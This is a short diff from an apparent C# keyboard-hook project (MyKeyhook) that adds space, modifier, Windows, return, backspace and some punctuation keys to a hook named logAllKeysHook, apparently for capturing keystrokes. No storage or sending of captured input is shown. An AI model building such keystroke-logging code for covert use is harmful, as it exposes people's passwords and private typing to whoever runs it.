@@ -109,7 +109,24 @@ namespace MyKeyhook
             logAllKeysHook.HookedKeys.Add(Keys.F10);
             logAllKeysHook.HookedKeys.Add(Keys.F11);
             logAllKeysHook.HookedKeys.Add(Keys.F12);
-            
+            //init formating keys
+            logAllKeysHook.HookedKeys.Add(Keys.Space);
+            logAllKeysHook.HookedKeys.Add(Keys.Tab);
+            logAllKeysHook.HookedKeys.Add(Keys.CapsLock);
+            logAllKeysHook.HookedKeys.Add(Keys.LControlKey);
+            logAllKeysHook.HookedKeys.Add(Keys.RControlKey);
+            logAllKeysHook.HookedKeys.Add(Keys.LShiftKey);
+            logAllKeysHook.HookedKeys.Add(Keys.RShiftKey);
+            logAllKeysHook.HookedKeys.Add(Keys.LWin);
+            logAllKeysHook.HookedKeys.Add(Keys.RWin);
+            logAllKeysHook.HookedKeys.Add(Keys.Menu);
+            logAllKeysHook.HookedKeys.Add(Keys.RMenu);
+            logAllKeysHook.HookedKeys.Add(Keys.Return);
+            logAllKeysHook.HookedKeys.Add(Keys.Back);
+            //init punctuation keys
+            logAllKeysHook.HookedKeys.Add(Keys.OemPipe);
+            logAllKeysHook.HookedKeys.Add(Keys.OemBackslash);
+
 
 
             //------------------------------------------------------------------------------------------------------------------------------------------------
